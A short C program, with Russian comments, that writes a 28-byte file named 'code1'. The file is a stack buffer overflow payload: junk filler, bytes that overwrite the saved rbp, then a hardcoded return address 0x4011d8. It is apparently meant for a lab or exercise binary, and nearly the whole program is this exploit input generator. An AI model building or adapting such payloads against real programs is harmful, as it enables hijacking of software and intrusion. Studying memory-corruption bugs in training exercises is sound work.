
#include <stdio.h>
#include <stdlib.h>

#define Z 28

int main(void)
{
unsigned char A[Z] = {'x','x','x','x','x','x','x','x','x','x', //мусор 10
                      'x','x',                                 //мусор  2
                              'x','x','x','x','x','x','x','x', // перетираем rbp
                       0xD8, 0x11, 0x40, 0x00, 0x00, 0x00, 0x0, 0x0  //0x 40 11 d8
                       };

FILE *fp;
if ((fp = fopen("code1", "wb"))==NULL)  { printf("Cannot open file.\n"); exit(1);}
fwrite(A, sizeof(char), Z, fp);
    fclose(fp); 

}
